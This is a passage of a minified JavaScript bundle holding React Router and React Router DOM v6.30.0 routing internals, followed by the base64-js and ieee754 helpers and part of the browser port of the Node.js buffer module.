k=!s&&t&&t.matches&&t.matches.length>0?t.matches:BN(n,{pathname:x}),I=pP(k&&k.map(A=>Object.assign({},A,{params:Object.assign({},l,A.params),pathname:ro([u,i.encodeLocation?i.encodeLocation(A.pathname).pathname:A.pathname]),pathnameBase:A.pathnameBase==="/"?u:ro([u,i.encodeLocation?i.encodeLocation(A.pathnameBase).pathname:A.pathnameBase])})),o,t,r);return e&&I?Y.createElement(wp.Provider,{value:{location:Bu({pathname:"/",search:"",hash:"",state:null,key:"default"},f),navigationType:Ws.Pop}},I):I}function uP(){let n=wP(),e=rP(n)?n.status+" "+n.statusText:n instanceof Error?n.message:JSON.stringify(n),t=n instanceof Error?n.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"},s=null;return Y.createElement(Y.Fragment,null,Y.createElement("h2",null,"Unexpected Application Error!"),Y.createElement("h3",{style:{fontStyle:"italic"}},e),t?Y.createElement("pre",{style:i},t):null,s)}const hP=Y.createElement(uP,null);class fP extends Y.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||t.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:t.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){console.error("React Router caught the following error during render",e,t)}render(){return this.state.error!==void 0?Y.createElement(Ea.Provider,{value:this.props.routeContext},Y.createElement(ZA.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function dP(n){let{routeContext:e,match:t,children:r}=n,i=Y.useContext(Uw);return i&&i.static&&i.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=t.route.id),Y.createElement(Ea.Provider,{value:e},r)}function pP(n,e,t,r){var i;if(e===void 0&&(e=[]),t===void 0&&(t=null),r===void 0&&(r=null),n==null){var s;if(!t)return null;if(t.errors)n=t.matches;else if((s=r)!=null&&s.v7_partialHydration&&e.length===0&&!t.initialized&&t.matches.length>0)n=t.matches;else return null}let o=n,a=(i=t)==null?void 0:i.errors;if(a!=null){let h=o.findIndex(f=>f.route.id&&(a==null?void 0:a[f.route.id])!==void 0);h>=0||pn(!1),o=o.slice(0,Math.min(o.length,h+1))}let l=!1,u=-1;if(t&&r&&r.v7_partialHydration)for(let h=0;h<o.length;h++){let f=o[h];if((f.route.HydrateFallback||f.route.hydrateFallbackElement)&&(u=h),f.route.id){let{loaderData:p,errors:w}=t,x=f.route.loader&&p[f.route.id]===void 0&&(!w||w[f.route.id]===void 0);if(f.route.lazy||x){l=!0,u>=0?o=o.slice(0,u+1):o=[o[0]];break}}}return o.reduceRight((h,f,p)=>{let w,x=!1,k=null,I=null;t&&(w=a&&f.route.id?a[f.route.id]:void 0,k=f.route.errorElement||hP,l&&(u<0&&p===0?(_P("route-fallback",!1),x=!0,I=null):u===p&&(x=!0,I=f.route.hydrateFallbackElement||null)));let A=e.concat(o.slice(0,p+1)),b=()=>{let E;return w?E=k:x?E=I:f.route.Component?E=Y.createElement(f.route.Component,null):f.route.element?E=f.route.element:E=h,Y.createElement(dP,{match:f,routeContext:{outlet:h,matches:A,isDataRoute:t!=null},children:E})};return t&&(f.route.ErrorBoundary||f.route.errorElement||p===0)?Y.createElement(fP,{location:t.location,revalidation:t.revalidation,component:k,error:w,children:b(),routeContext:{outlet:null,matches:A,isDataRoute:!0}}):b()},null)}var eb=function(n){return n.UseBlocker="useBlocker",n.UseRevalidator="useRevalidator",n.UseNavigateStable="useNavigate",n}(eb||{}),_d=function(n){return n.UseBlocker="useBlocker",n.UseLoaderData="useLoaderData",n.UseActionData="useActionData",n.UseRouteError="useRouteError",n.UseNavigation="useNavigation",n.UseRouteLoaderData="useRouteLoaderData",n.UseMatches="useMatches",n.UseRevalidator="useRevalidator",n.UseNavigateStable="useNavigate",n.UseRouteId="useRouteId",n}(_d||{});function gP(n){let e=Y.useContext(Uw);return e||pn(!1),e}function mP(n){let e=Y.useContext(sP);return e||pn(!1),e}function yP(n){let e=Y.useContext(Ea);return e||pn(!1),e}function tb(n){let e=yP(),t=e.matches[e.matches.length-1];return t.route.id||pn(!1),t.route.id}function wP(){var n;let e=Y.useContext(ZA),t=mP(_d.UseRouteError),r=tb(_d.UseRouteError);return e!==void 0?e:(n=t.errors)==null?void 0:n[r]}function vP(){let{router:n}=gP(eb.UseNavigateStable),e=tb(_d.UseNavigateStable),t=Y.useRef(!1);return JA(()=>{t.current=!0}),Y.useCallback(function(i,s){s===void 0&&(s={}),t.current&&(typeof i=="number"?n.navigate(i):n.navigate(i,Bu({fromRouteId:e},s)))},[n,e])}const sE={};function _P(n,e,t){!e&&!sE[n]&&(sE[n]=!0)}function EP(n,e){n==null||n.v7_startTransition,(n==null?void 0:n.v7_relativeSplatPath)===void 0&&(!e||e.v7_relativeSplatPath),e&&(e.v7_fetcherPersist,e.v7_normalizeFormMethod,e.v7_partialHydration,e.v7_skipActionErrorRevalidation)}function Uo(n){pn(!1)}function IP(n){let{basename:e="/",children:t=null,location:r,navigationType:i=Ws.Pop,navigator:s,static:o=!1,future:a}=n;ch()&&pn(!1);let l=e.replace(/^\/*/,"/"),u=Y.useMemo(()=>({basename:l,navigator:s,static:o,future:Bu({v7_relativeSplatPath:!1},a)}),[l,a,s,o]);typeof r=="string"&&(r=rc(r));let{pathname:h="/",search:f="",hash:p="",state:w=null,key:x="default"}=r,k=Y.useMemo(()=>{let I=Bw(h,l);return I==null?null:{location:{pathname:I,search:f,hash:p,state:w,key:x},navigationType:i}},[l,h,f,p,w,x,i]);return k==null?null:Y.createElement(_a.Provider,{value:u},Y.createElement(wp.Provider,{children:t,value:k}))}function SP(n){let{children:e,location:t}=n;return lP(P0(e),t)}new Promise(()=>{});function P0(n,e){e===void 0&&(e=[]);let t=[];return Y.Children.forEach(n,(r,i)=>{if(!Y.isValidElement(r))return;let s=[...e,i];if(r.type===Y.Fragment){t.push.apply(t,P0(r.props.children,s));return}r.type!==Uo&&pn(!1),!r.props.index||!r.props.children||pn(!1);let o={id:r.props.id||s.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(o.children=P0(r.props.children,s)),t.push(o)}),t}/**
 * React Router DOM v6.30.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function L0(){return L0=Object.assign?Object.assign.bind():function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},L0.apply(this,arguments)}function TP(n,e){if(n==null)return{};var t={},r=Object.keys(n),i,s;for(s=0;s<r.length;s++)i=r[s],!(e.indexOf(i)>=0)&&(t[i]=n[i]);return t}function AP(n){return!!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey)}function bP(n,e){return n.button===0&&(!e||e==="_self")&&!AP(n)}const xP=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],kP="6";try{window.__reactRouterVersion=kP}catch{}const CP="startTransition",oE=SR[CP];function RP(n){let{basename:e,children:t,future:r,window:i}=n,s=Y.useRef();s.current==null&&(s.current=LN({window:i,v5Compat:!0}));let o=s.current,[a,l]=Y.useState({action:o.action,location:o.location}),{v7_startTransition:u}=r||{},h=Y.useCallback(f=>{u&&oE?oE(()=>l(f)):l(f)},[l,u]);return Y.useLayoutEffect(()=>o.listen(h),[o,h]),Y.useEffect(()=>EP(r),[r]),Y.createElement(IP,{basename:e,children:t,location:a.location,navigationType:a.action,navigator:o,future:r})}const MP=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",NP=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,qr=Y.forwardRef(function(e,t){let{onClick:r,relative:i,reloadDocument:s,replace:o,state:a,target:l,to:u,preventScrollReset:h,viewTransition:f}=e,p=TP(e,xP),{basename:w}=Y.useContext(_a),x,k=!1;if(typeof u=="string"&&NP.test(u)&&(x=u,MP))try{let E=new URL(window.location.href),O=u.startsWith("//")?new URL(E.protocol+u):new URL(u),W=Bw(O.pathname,w);O.origin===E.origin&&W!=null?u=W+O.search+O.hash:k=!0}catch{}let I=oP(u,{relative:i}),A=PP(u,{replace:o,state:a,target:l,preventScrollReset:h,relative:i,viewTransition:f});function b(E){r&&r(E),E.defaultPrevented||A(E)}return Y.createElement("a",L0({},p,{href:x||I,onClick:k||s?r:b,ref:t,target:l}))});var aE;(function(n){n.UseScrollRestoration="useScrollRestoration",n.UseSubmit="useSubmit",n.UseSubmitFetcher="useSubmitFetcher",n.UseFetcher="useFetcher",n.useViewTransitionState="useViewTransitionState"})(aE||(aE={}));var lE;(function(n){n.UseFetcher="useFetcher",n.UseFetchers="useFetchers",n.UseScrollRestoration="useScrollRestoration"})(lE||(lE={}));function PP(n,e){let{target:t,replace:r,state:i,preventScrollReset:s,relative:o,viewTransition:a}=e===void 0?{}:e,l=jw(),u=vp(),h=XA(n,{relative:o});return Y.useCallback(f=>{if(bP(f,t)){f.preventDefault();let p=r!==void 0?r:vd(u)===vd(h);l(n,{replace:p,state:i,preventScrollReset:s,relative:o,viewTransition:a})}},[u,l,h,r,i,t,n,s,o,a])}var ve={},_p={};_p.byteLength=OP;_p.toByteArray=UP;_p.fromByteArray=FP;var Ai=[],Vr=[],LP=typeof Uint8Array<"u"?Uint8Array:Array,qg="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(var za=0,DP=qg.length;za<DP;++za)Ai[za]=qg[za],Vr[qg.charCodeAt(za)]=za;Vr["-".charCodeAt(0)]=62;Vr["_".charCodeAt(0)]=63;function nb(n){var e=n.length;if(e%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var t=n.indexOf("=");t===-1&&(t=e);var r=t===e?0:4-t%4;return[t,r]}function OP(n){var e=nb(n),t=e[0],r=e[1];return(t+r)*3/4-r}function BP(n,e,t){return(e+t)*3/4-t}function UP(n){var e,t=nb(n),r=t[0],i=t[1],s=new LP(BP(n,r,i)),o=0,a=i>0?r-4:r,l;for(l=0;l<a;l+=4)e=Vr[n.charCodeAt(l)]<<18|Vr[n.charCodeAt(l+1)]<<12|Vr[n.charCodeAt(l+2)]<<6|Vr[n.charCodeAt(l+3)],s[o++]=e>>16&255,s[o++]=e>>8&255,s[o++]=e&255;return i===2&&(e=Vr[n.charCodeAt(l)]<<2|Vr[n.charCodeAt(l+1)]>>4,s[o++]=e&255),i===1&&(e=Vr[n.charCodeAt(l)]<<10|Vr[n.charCodeAt(l+1)]<<4|Vr[n.charCodeAt(l+2)]>>2,s[o++]=e>>8&255,s[o++]=e&255),s}function jP(n){return Ai[n>>18&63]+Ai[n>>12&63]+Ai[n>>6&63]+Ai[n&63]}function VP(n,e,t){for(var r,i=[],s=e;s<t;s+=3)r=(n[s]<<16&16711680)+(n[s+1]<<8&65280)+(n[s+2]&255),i.push(jP(r));return i.join("")}function FP(n){for(var e,t=n.length,r=t%3,i=[],s=16383,o=0,a=t-r;o<a;o+=s)i.push(VP(n,o,o+s>a?a:o+s));return r===1?(e=n[t-1],i.push(Ai[e>>2]+Ai[e<<4&63]+"==")):r===2&&(e=(n[t-2]<<8)+n[t-1],i.push(Ai[e>>10]+Ai[e>>4&63]+Ai[e<<2&63]+"=")),i.join("")}var Vw={};/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */Vw.read=function(n,e,t,r,i){var s,o,a=i*8-r-1,l=(1<<a)-1,u=l>>1,h=-7,f=t?i-1:0,p=t?-1:1,w=n[e+f];for(f+=p,s=w&(1<<-h)-1,w>>=-h,h+=a;h>0;s=s*256+n[e+f],f+=p,h-=8);for(o=s&(1<<-h)-1,s>>=-h,h+=r;h>0;o=o*256+n[e+f],f+=p,h-=8);if(s===0)s=1-u;else{if(s===l)return o?NaN:(w?-1:1)*(1/0);o=o+Math.pow(2,r),s=s-u}return(w?-1:1)*o*Math.pow(2,s-r)};Vw.write=function(n,e,t,r,i,s){var o,a,l,u=s*8-i-1,h=(1<<u)-1,f=h>>1,p=i===23?Math.pow(2,-24)-Math.pow(2,-77):0,w=r?0:s-1,x=r?1:-1,k=e<0||e===0&&1/e<0?1:0;for(e=Math.abs(e),isNaN(e)||e===1/0?(a=isNaN(e)?1:0,o=h):(o=Math.floor(Math.log(e)/Math.LN2),e*(l=Math.pow(2,-o))<1&&(o--,l*=2),o+f>=1?e+=p/l:e+=p*Math.pow(2,1-f),e*l>=2&&(o++,l/=2),o+f>=h?(a=0,o=h):o+f>=1?(a=(e*l-1)*Math.pow(2,i),o=o+f):(a=e*Math.pow(2,f-1)*Math.pow(2,i),o=0));i>=8;n[t+w]=a&255,w+=x,a/=256,i-=8);for(o=o<<i|a,u+=i;u>0;n[t+w]=o&255,w+=x,o/=256,u-=8);n[t+w-x]|=k*128};/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */(function(n){const e=_p,t=Vw,r=typeof Symbol=="function"&&typeof Symbol.for=="function"?Symbol.for("nodejs.util.inspect.custom"):null;n.Buffer=a,n.SlowBuffer=b,n.INSPECT_MAX_BYTES=50;const i=2147483647;n.kMaxLength=i,a.TYPED_ARRAY_SUPPORT=s(),!a.TYPED_ARRAY_SUPPORT&&typeof console<"u"&&typeof console.error=="function"&&console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");function s(){try{const P=new Uint8Array(1),m={foo:function(){return 42}};return Object.setPrototypeOf(m,Uint8Array.prototype),Object.setPrototypeOf(P,m),P.foo()===42}catch{return!1}}Object.defineProperty(a.prototype,"parent",{enumerable:!0,get:function(){if(a.isBuffer(this))return this.buffer}}),Object.defineProperty(a.prototype,"offset",{enumerable:!0,get:function(){if(a.isBuffer(this))return this.byteOffset}});function o(P){if(P>i)throw new RangeError('The value "'+P+'" is invalid for option "size"');const m=new Uint8Array(P);return Object.setPrototypeOf(m,a.prototype),m}function a(P,m,v){if(typeof P=="number"){if(typeof m=="string")throw new TypeError('The "string" argument must be of type string. Received type number');return f(P)}return l(P,m,v)}a.poolSize=8192;function l(P,m,v){if(typeof P=="string")return p(P,m);if(ArrayBuffer.isView(P))return x(P);if(P==null)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof P);if(an(P,ArrayBuffer)||P&&an(P.buffer,ArrayBuffer)||typeof SharedArrayBuffer<"u"&&(an(P,SharedArrayBuffer)||P&&an(P.buffer,SharedArrayBuffer)))return k(P,m,v);if(typeof P=="number")throw new TypeError('The "value" argument must not be of type number. Received type number');const F=P.valueOf&&P.valueOf();if(F!=null&&F!==P)return a.from(F,m,v);const G=I(P);if(G)return G;if(typeof Symbol<"u"&&Symbol.toPrimitive!=null&&typeof P[Symbol.toPrimitive]=="function")return a.from(P[Symbol.toPrimitive]("string"),m,v);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof P)}a.from=function(P,m,v){return l(P,m,v)},Object.setPrototypeOf(a.prototype,Uint8Array.prototype),Object.setPrototypeOf(a,Uint8Array);function u(P){if(typeof P!="number")throw new TypeError('"size" argument must be of type number');if(P<0)throw new RangeError('The value "'+P+'" is invalid for option "size"')}function h(P,m,v){return u(P),P<=0?o(P):m!==void 0?typeof v=="string"?o(P).fill(m,v):o(P).fill(m):o(P)}a.alloc=function(P,m,v){return h(P,m,v)};function f(P){return u(P),o(P<0?0:A(P)|0)}a.allocUnsafe=function(P){return f(P)},a.allocUnsafeSlow=function(P){return f(P)};function p(P,m){if((typeof m!="string"||m==="")&&(m="utf8"),!a.isEncoding(m))throw new TypeError("Unknown encoding: "+m);const v=E(P,m)|0;let F=o(v);const G=F.write(P,m);return G!==v&&(F=F.slice(0,G)),F}function w(P){const m=P.length<0?0:A(P.length)|0,v=o(m);for(let F=0;F<m;F+=1)v[F]=P[F]&255;return v}function x(P){if(an(P,Uint8Array)){const m=new Uint8Array(P);return k(m.buffer,m.byteOffset,m.byteLength)}return w(P)}function k(P,m,v){if(m<0||P.byteLength<m)throw new RangeError('"offset" is outside of buffer bounds');if(P.byteLength<m+(v||0))throw new RangeError('"length" is outside of buffer bounds');let F;return m===void 0&&v===void 0?F=new Uint8Array(P):v===void 0?F=new Uint8Array(P,m):F=new Uint8Array(P,m,v),Object.setPrototypeOf(F,a.prototype),F}function I(P){if(a.isBuffer(P)){const m=A(P.length)|0,v=o(m);return v.length===0||P.copy(v,0,0,m),v}if(P.length!==void 0)return typeof P.length!="number"||lt(P.length)?o(0):w(P);if(P.type==="Buffer"&&Array.isArray(P.data))return w(P.data)}function A(P){if(P>=i)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+i.toString(16)+" bytes");return P|0}function b(P){return+P!=P&&(P=0),a.alloc(+P)}a.isBuffer=function(m){return m!=null&&m._isBuffer===!0&&m!==a.prototype},a.compare=function(m,v){if(an(m,Uint8Array)&&(m=a.from(m,m.offset,m.byteLength)),an(v,Uint8Array)&&(v=a.from(v,v.offset,v.byteLength)),!a.isBuffer(m)||!a.isBuffer(v))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(m===v)return 0;let F=m.length,G=v.length;for(let J=0,te=Math.min(F,G);J<te;++J)if(m[J]!==v[J]){F=m[J],G=v[J];break}return F<G?-1:G<F?1:0},a.isEncoding=function(m){switch(String(m).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},a.concat=function(m,v){if(!Array.isArray(m))throw new TypeError('"list" argument must be an Array of Buffers');if(m.length===0)return a.alloc(0);let F;if(v===void 0)for(v=0,F=0;F<m.length;++F)v+=m[F].length;const G=a.allocUnsafe(v);let J=0;for(F=0;F<m.length;++F){let te=m[F];if(an(te,Uint8Array))J+te.length>G.length?(a.isBuffer(te)||(te=a.from(te)),te.copy(G,J)):Uint8Array.prototype.set.call(G,te,J);else if(a.isBuffer(te))te.copy(G,J);else throw new TypeError('"list" argument must be an Array of Buffers');J+=te.length}return G};function E(P,m){if(a.isBuffer(P))return P.length;if(ArrayBuffer.isView(P)||an(P,ArrayBuffer))return P.byteLength;if(typeof P!="string")throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof P);const v=P.length,F=arguments.length>2&&arguments[2]===!0;if(!F&&v===0)return 0;let G=!1;for(;;)switch(m){case"ascii":case"latin1":case"binary":return v;case"utf8":case"utf-8":return ot(P).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return v*2;case"hex":return v>>>1;case"base64":return at(P).length;default:if(G)return F?-1:ot(P).length;m=(""+m).toLowerCase(),G=!0}}a.byteLength=E;function O(P,m,v){let F=!1;if((m===void 0||m<0)&&(m=0),m>this.length||((v===void 0||v>this.length)&&(v=this.length),v<=0)||(v>>>=0,m>>>=0,v<=m))return"";for(P||(P="utf8");;)switch(P){case"hex":return j(this,m,v);case"utf8":case"utf-8":return d(this,m,v);case"ascii":return M(this,m,v);case"latin1":case"binary":return R(this,m,v);case"base64":return S(this,m,v);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return H(this,m,v);default:if(F)throw new TypeError("Unknown encoding: "+P);P=(P+"").toLowerCase(),F=!0}}a.prototype._isBuffer=!0;function W(P,m,v){const F=P[m];P[m]=P[v],P[v]=F}a.prototype.swap16=function(){const m=this.length;if(m%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let v=0;v<m;v+=2)W(this,v,v+1);return this},a.prototype.swap32=function(){const m=this.length;if(m%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let v=0;v<m;v+=4)W(this,v,v+3),W(this,v+1,v+2);return this},a.prototype.swap64=function(){const m=this.length;if(m%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let v=0;v<m;v+=8)W(this,v,v+7),W(this,v+1,v+6),W(this,v+2,v+5),W(this,v+3,v+4);return this},a.prototype.toString=function(){const m=this.length;return m===0?"":arguments.length===0?d(this,0,m):O.apply(this,arguments)},a.prototype.toLocaleString=a.prototype.toString,a.prototype.equals=function(m){if(!a.isBuffer(m))throw new TypeError("Argument must be a Buffer");return this===m?!0:a.compare(this,m)===0},a.prototype.inspect=function(){let m="";const v=n.INSPECT_MAX_BYTES;return m=this.toString("hex",0,v).replace(/(.{2})/g,"$1 ").trim(),this.length>v&&(m+=" ... "),"<Buffer "+m+">"},r&&(a.prototype[r]=a.prototype.inspect),a.prototype.compare=function(m,v,F,G,J){if(an(m,Uint8Array)&&(m=a.from(m,m.offset,m.byteLength)),!a.isBuffer(m))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof m);if(v===void 0&&(v=0),F===void 0&&(F=m?m.length:0),G===void 0&&(G=0),J===void 0&&(J=this.length),v<0||F>m.length||G<0||J>this.length)throw new RangeError("out of range index");if(G>=J&&v>=F)return 0;if(G>=J)return-1;if(v>=F)return 1;if(v>>>=0,F>>>=0,G>>>=0,J>>>=0,this===m)return 0;let te=J-G,Oe=F-v;const Le=Math.min(te,Oe),Re=this.slice(G,J),mt=m.slice(v,F);for(let ke=0;ke<Le;++ke)if(Re[ke]!==mt[ke]){te=Re[ke],Oe=mt[ke];break}return te<Oe?-1:Oe<te?1:0};function q(P,m,v,F,G){if(P.length===0)return-1;if(typeof v=="string"?(F=v,v=0):v>2147483647?v=2147483647:v<-2147483648&&(v=-2147483648),v=+v,lt(v)&&(v=G?0:P.length-1),v<0&&(v=P.length+v),v>=P.length){if(G)return-1;v=P.length-1}else if(v<0)if(G)v=0;else return-1;if(typeof m=="string"&&(m=a.from(m,F)),a.isBuffer(m))return m.length===0?-1:L(P,m,v,F,G);if(typeof m=="number")return m=m&255,typeof Uint8Array.prototype.indexOf=="function"?G?Uint8Array.prototype.indexOf.call(P,m,v):Uint8Array.prototype.lastIndexOf.call(P,m,v):L(P,[m],v,F,G);throw new TypeError("val must be string, number or Buffer")}function L(P,m,v,F,G){let J=1,te=P.length,Oe=m.length;if(F!==void 0&&(F=String(F).toLowerCase(),F==="ucs2"||F==="ucs-2"||F==="utf16le"||F==="utf-16le")){if(P.length<2||m.length<2)return-1;J=2,te/=2,Oe/=2,v/=2}function Le(mt,ke){return J===1?mt[ke]:mt.readUInt16BE(ke*J)}let Re;if(G){let mt=-1;for(Re=v;Re<te;Re++)if(Le(P,Re)===Le(m,mt===-1?0:Re-mt)){if(mt===-1&&(mt=Re),Re-mt+1===Oe)return mt*J}else mt!==-1&&(Re-=Re-mt),mt=-1}else for(v+Oe>te&&(v=te-Oe),Re=v;Re>=0;Re--){let mt=!0;for(let ke=0;ke<Oe;ke++)if(Le(P,Re+ke)!==Le(m,ke)){mt=!1;break}if(mt)return Re}return-1}a.prototype.includes=function(m,v,F){return this.indexOf(m,v,F)!==-1},a.prototype.indexOf=function(m,v,F){return q(this,m,v,F,!0)},a.prototype.lastIndexOf=function(m,v,F){return q(this,m,v,F,!1)};function N(P,m,v,F){v=Number(v)||0;const G=P.length-v;F?(F=Number(F),F>G&&(F=G)):F=G;const J=m.length;F>J/2&&(F=J/2);let te;for(te=0;te<F;++te){const Oe=parseInt(m.substr(te*2,2),16);if(lt(Oe))return te;P[v+te]=Oe}return te}function B(P,m,v,F){return Xe(ot(m,P.length-v),P,v,F)}function z(P,m,v,F){return Xe(vt(m),P,v,F)}function $(P,m,v,F){return Xe(at(m),P,v,F)}function K(P,m,v,F){return Xe(Vi(m,P.length-v),P,v,F)}a.prototype.write=function(m,v,F,G){if(v===void 0)G="utf8",F=this.length,v=0;else if(F===void 0&&typeof v=="string")G=v,F=this.length,v=0;else if(isFinite(v))v=v>>>0,isFinite(F)?(F=F>>>0,G===void 0&&(G="utf8")):(G=F,F=void 0);else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");const J=this.length-v;if((F===void 0||F>J)&&(F=J),m.length>0&&(F<0||v<0)||v>this.length)throw new RangeError("Attempt to write outside buffer bounds");G||(G="utf8");let te=!1;for(;;)switch(G){case"hex":return N(this,m,v,F);case"utf8":case"utf-8":return B(this,m,v,F);case"ascii":case"latin1":case"binary":return z(this,m,v,F);case"base64":return $(this,m,v,F);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return K(this,m,v,F);default:if(te)throw new TypeError("Unknown encoding: "+G);G=(""+G).toLowerCase(),te=!0}},a.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};function S(P,m,v){return m===0&&v===P.length?e.fromByteArray(P):e.fromByteArray(P.slice(m,v))}function d(P,m,v){v=Math.min(P.length,v);const F=[];let G=m;for(;G<v;){const J=P[G];let te=null,Oe=J>239?4:J>223?3:J>191?2:1;if(G+Oe<=v){let Le,Re,mt,ke;switch(Oe){case 1:J<128&&(te=J);break;case 2:Le=P[G+1],(Le&192)===128&&(ke=(J&31)<<6|Le&63,ke>127&&(te=ke));break;case 3:Le=P[G+1],Re=P[G+2],(Le&192)===128&&(Re&192)===128&&(ke=(J&15)<<12|(Le&63)<<6|Re&63,ke>2047&&(ke<55296||ke>57343)&&(te=ke));break;case 4:Le=P[G+1],Re=P[G+2],mt=P[G+3],(Le&192)===128&&(Re&192)===128&&(mt&192)===128&&(ke=(J&15)<<18|(Le&63)<<12|(Re&63)<<6|mt&63,ke>65535&&ke<1114112&&(te=ke))}}te===null?(te=65533,Oe=1):te>65535&&(te-=65536,F.push(te>>>10&1023|55296),te=56320|te&1023),F.push(te),G+=Oe}return C(F)}const _=4096;function C(P){const m=P.length;if(m<=_)return String.fromCharCode.apply(String,P);let v="",F=0;for(;F<m;)v+=String.fromCharCode.apply(String,P.slice(F,F+=_));return v}function M(P,m,v){let F="";v=Math.min(P.length,v);for(let G=m;G<v;++G)F+=String.fromCharCode(P[G]&127);return F}function R(P,m,v){let F="";v=Math.min(P.length,v);for(let G=m;G<v;++G)F+=String.fromCharCode(P[G]);return F}function j(P,m,v){const F=P.length;(!m||m<0)&&(m=0),(!v||v<0||v>F)&&(v=F);let G="";for(let J=m;J<v;++J)G+=ct[P[J]];return G}function H(P,m,v){const F=P.slice(m,v);let G="";for(let J=0;J<F.length-1;J+=2)G+=String.fromCharCode(F[J]+F[J+1]*256);return G}a.prototype.slice=function(m,v){const F=this.length;m=~~m,v=v===void 0?F:~~v,m<0?(m+=F,m<0&&(m=0)):m>F&&(m=F),v<0?(v+=F,v<0&&(v=0)):v>F&&(v=F),v<m&&(v=m);const G=this.subarray(m,v);return Object.setPrototypeOf(G,a.prototype),G};function D(P,m,v){if(P%1!==0||P<0)throw new RangeError("offset is not uint");if(P+m>v)throw new RangeError("Trying to access beyond buffer length")}a.prototype.readUintLE=a.prototype.readUIntLE=function(m,v,F){m=m>>>0,v=v>>>0,F||D(m,v,this.length);let G=this[m],J=1,te=0;for(;++te<v&&(J*=256);)G+=this[m+te]*J;return G},a.prototype.readUintBE=a.prototype.readUIntBE=function(m,v,F){m=m>>>0,v=v>>>0,F||D(m,v,this.length);let G=this[m+--v],J=1;for(;v>0&&(J*=256);)G+=this[m+--v]*J;return G},a.prototype.readUint8=a.prototype.readUInt8=function(m,v){return m=m>>>0,v||D(m,1,this.length),this[m]},a.prototype.readUint16LE=a.prototype.readUInt16LE=function(m,v){return m=m>>>0,v||D(m,2,this.length),this[m]|this[m+1]<<8},a.prototype.readUint16BE=a.prototype.readUInt16BE=function(m,v){return m=m>>>0,v||D(m,2,this.length),this[m]<<8|this[m+1]},a.prototype.readUint32LE=a.prototype.readUInt32LE=function(m,v){return m=m>>>0,v||D(m,4,this.length),(this[m]|this[m+1]<<8|this[m+2]<<16)+this[m+3]*16777216},a.prototype.readUint32BE=a.prototype.readUInt32BE=function(m,v){return m=m>>>0,v||D(m,4,this.length),this[m]*16777216+(this[m+1]<<16|this[m+2]<<8|this[m+3])},a.prototype.readBigUInt64LE=vn(function(m){m=m>>>0,Pt(m,"offset");const v=this[m],F=this[m+7];(v===void 0||F===void 0)&&We(m,this.length-8);const G=v+this[++m]*2**8+this[++m]*2**16+this[++m]*2**24,J=this[++m]+this[++m]*2**8+this[++m]*2**16+F*2**24;return BigInt(G)+(BigInt(J)<<BigInt(32))}),a.prototype.readBigUInt64BE=vn(function(m){m=m>>>0,Pt(m,"offset");const v=this[m],F=this[m+7];(v===void 0||F===void 0)&&We(m,this.length-8);const G=v*2**24+this[++m]*2**16+this[++m]*2**8+this[++m],J=this[++m]*2**24+this[++m]*2**16+this[++m]*2**8+F;return(BigInt(G)<<BigInt(32))+BigInt(J)}),a.prototype.readIntLE=function(m,v,F){m=m>>>0,v=v>>>0,F||D(m,v,this.length);let G=this[m],J=1,te=0;for(;++te<v&&(J*=256);)G+=this[m+te]*J;return J*=128,G>=J&&(G-=Math.pow(2,8*v)),G},a.prototype.readIntBE=function(m,v,F){m=m>>>0,v=v>>>0,F||D(m,v,this.length);let G=v,J=1,te=this[m+--G];for(;G>0&&(J*=256);)te+=this[m+--G]*J;return J*=128,te>=J&&(te-=Math.pow(2,8*v)),te},a.prototype.readInt8=function(m,v){return 